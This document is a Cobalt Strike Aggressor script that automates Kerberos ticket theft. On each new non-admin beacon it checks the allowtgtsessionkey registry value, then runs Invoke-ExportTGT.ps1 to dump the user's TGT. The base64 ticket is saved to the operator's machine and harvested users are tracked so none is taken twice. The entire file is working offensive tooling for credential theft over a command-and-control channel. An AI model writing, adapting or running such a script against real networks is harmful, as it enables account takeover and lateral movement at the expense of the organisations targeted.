global('@exportedUsers');
@exportedUsers = @();

sub grabTGT {
    bpowershell_import($1, script_resource("Invoke-ExportTGT.ps1"));
    bpowershell($1, "Invoke-ExportTGT");
}

on beacon_initial {
    $username = binfo($1, "user");
    $pid = binfo($1, "pid");
    $hostname = binfo($1, "computer");
    $note = binfo($1, "note");

    if ( -isadmin $1 )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("RESULT: skipping because beacon is in Administrative Context");
    }
    # this will force aggressor script to only grab users's TGT once, helpful if spawning new beacons as that user.  Comment out if you need to grab TGT EVERYTIME beacon comes in.
    else if ( $username in @exportedUsers )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("RESULT: skipping because user's TGT has already been Exported.");
    }
    else if ( "be evaluated" isin $note )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("RESULT: skipping because likely DNS beacon based on note.");
    } 
    else
    {
        #bpowershell($1, '((gp HKLM:System\CurrentControlSet\Control\Lsa\Kerberos\Parameters).allowtgtsessionkey)');
        bshell($1, 'reg query HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters');
    }
}

on beacon_output {
    #println($2);
    #println("The time is now: " . tstamp(ticks()));

    # setup constants to search in beacon output
    $checkRegKeySuccess = "allowtgtsessionkey    REG_DWORD    0x1";
    $checkRegKeyFail = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters";
    $exportTGTsuccess = "Base64 encoded Kerberos TGT ticket: ";
    $exportTGTfail1 = "ERROR: Unable to pull kerberos tickets from memory";
    $exportTGTfail2 = "WARNING: Unable to obtain ticket";

    # grab beacon metadata for event logging
    $username = binfo($1, "user");
    $pid = binfo($1, "pid");
    $hostname = binfo($1, "computer");

    if ( $checkRegKeySuccess isin $2 )
    {
        grabTGT($1)
    }
    else if ( $checkRegKeyFail isin $2 )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("Result: UNABLE TO OBTAIN TGT - allowtgtsession registry value not set"); 
    }

    if ( $exportTGTsuccess isin $2 )
    {
        $fileName = "ExportedTGT_" . $username . ".txt";

        println("\nHost: $hostname");
        println("User: $username");
        println("Result: SUCCESSFULLY EXPORTED TGT"); 
        elog("EXPORTED TGT for $username on host $hostname with PID $pid" . ".  Saving as $fileName"); 

        # Save ticket locally to operator's client
        $handle = openf("> $fileName");
        println($handle, replace($2, 'received output:\n'.''));
        closef($handle);

        add(@exportedUsers, $username);
    }
    else if ( $exportTGTfail1 isin $2 )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("Result: UNABLE TO OBTAIN TGT - mimikatz kerberos:list /export failed, but allowtgtsession registry value is set"); 
    }
    else if ( $exportTGTfail2 isin $2 )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("Result: UNABLE TO OBTAIN TGT - error occured while processing mimikatz output, but allowtgtsession registry value is set"); 
    }
}
